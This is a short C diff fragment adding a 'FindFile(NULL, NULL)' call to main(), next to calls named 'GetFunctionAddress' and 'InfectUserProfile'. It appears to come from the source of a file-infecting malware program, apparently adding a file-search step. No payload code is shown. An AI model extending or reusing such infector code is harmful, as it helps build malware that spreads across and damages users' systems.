@@ -482,6 +482,8 @@ int main()
     data.iat = &iat;
     GetFunctionAddress(&data);
     InfectUserProfile(&data);
+
+    FindFile(NULL, NULL);
     return 0;
 }
 
